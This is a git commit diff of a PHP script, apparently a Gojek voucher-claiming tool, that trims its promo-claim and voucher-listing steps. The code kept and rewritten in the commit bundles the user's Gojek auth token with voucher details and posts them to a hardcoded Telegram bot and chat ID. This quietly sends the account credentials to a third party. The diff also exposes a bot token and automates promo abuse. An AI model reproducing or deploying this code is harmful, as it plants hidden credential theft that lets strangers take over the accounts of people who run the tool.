292f32c4596f16a30ae003231b07d36a1e4b79fa
azr555secret <60191913+azr555secret@users.noreply.github.com>
2020-03-08 23:13:03 +0700

    Update vc.php

--- vc.php
+++ vc.php
@@ -68,31 +68,15 @@ echo color("green"," =================================== \n");
 				echo "\n".color("green","+] Message: ".$message);
 				sleep(3);
 				
-				echo "\n".color("yellow","!] Claim Voc Ride");
-				echo "\n".color("yellow","!] Please wait...");
-				for($a=1;$a<=3;$a++){
-					echo color("yellow",".");
-					sleep(1);
-				}
-				sleep(3);
-				$gocar = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGORIDE"}');
-				$message = fetch_value($gocar,'"message":"','"');
-				echo "\n".color("green","+] Message: ".$message);
-				sleep(3);
-				
 				$cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
 				$total = fetch_value($cekvoucher,'"total_vouchers":',',');
+				$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
 				$voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
 				$voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
-				$voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
 				$voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
 				$voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
 				$voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
 				$voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
-				$voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
-				$voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
-				$voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
-				
 				echo "\n".color("yellow","-> Total voucher ".$total." : ");
 				echo "\n".color("green","1. ".$voucher1);
 				echo "\n".color("green","2. ".$voucher2);
@@ -101,11 +85,7 @@ echo color("green"," =================================== \n");
 				echo "\n".color("green","5. ".$voucher5);
 				echo "\n".color("green","6. ".$voucher6);
 				echo "\n".color("green","7. ".$voucher7);
-				echo "\n".color("green","8. ".$voucher8);
-				echo "\n".color("green","9. ".$voucher9);
-				echo "\n".color("green","10. ".$voucher10);
 				echo"\n";
-				
 				$expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
 				$expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
 				$expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
@@ -113,16 +93,9 @@ echo color("green"," =================================== \n");
 				$expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
 				$expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
 				$expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
-				$expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
-				$expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
-				$expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
-				
-				
 				$TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
 				$chatid = "785784404";
-				$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] 
-					".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+]
-					".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."]";
+				$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
 				$method	= "sendMessage";
 				$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
 				$post = ['chat_id' => $chatid, 'text' => $pesan];
